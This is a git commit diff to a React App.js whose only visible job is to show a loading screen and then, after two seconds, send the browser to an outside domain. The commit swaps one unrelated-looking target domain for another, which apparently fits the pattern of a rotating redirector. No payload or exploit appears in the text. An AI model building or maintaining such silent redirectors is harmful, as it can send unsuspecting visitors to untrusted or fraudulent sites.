fca0948a16f89288362445ab85d304b3fca810a4
husknet <127146284+husknet@users.noreply.github.com>
2024-12-17 15:39:16 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://bk.myciapresta.com.ar';
+            window.location.href = 'https://ysl.biquest.cl/';
         }, 2000);
 
         return () => clearTimeout(timer);
